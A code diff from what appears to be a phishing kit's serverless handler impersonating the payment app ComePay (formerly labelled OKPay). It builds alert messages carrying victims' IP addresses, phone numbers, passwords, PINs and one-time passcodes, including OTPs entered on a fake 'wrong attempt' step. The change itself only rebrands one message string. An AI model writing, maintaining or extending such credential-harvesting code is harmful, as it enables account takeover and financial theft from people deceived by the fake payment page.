@@ -19,7 +19,7 @@ export default async function handler(req, res) {
   if (type === 'login') {
     message = `✅ <b>New ComePay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin || 'N/A'}</code>`;
   } else if (type === 'send_otp' || type === 'modal_otp') {
-    message = `🔐 <b>OTP Requested (OKPay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
+    message = `🔐 <b>OTP Requested (comePay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
   } else if (type === 'verify_otp') {
     message = `🔑 <b>OTP Entered (Wrong Attempt - comepay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
   } else {
